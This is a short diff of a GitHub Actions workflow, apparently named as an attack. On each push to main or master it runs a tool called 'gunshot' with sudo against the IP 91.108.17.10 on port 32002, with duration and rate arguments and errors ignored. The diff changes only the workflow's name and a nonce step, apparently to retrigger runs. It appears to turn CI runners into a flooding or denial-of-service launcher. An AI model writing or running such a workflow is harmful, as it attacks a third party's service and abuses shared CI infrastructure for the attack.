@@ -1,4 +1,4 @@
-name: attack-e76235e2
+name: attack-49c3bdee
 on:
   push:
     branches: [ main, master ]
@@ -20,5 +20,5 @@ jobs:
     - name: Fire
       run: sudo ./gunshot 91.108.17.10 32002 60 200
       continue-on-error: true
-    - name: Nonce e76235e2
-      run: echo "nonce=e76235e2"
+    - name: Nonce 49c3bdee
+      run: echo "nonce=49c3bdee"
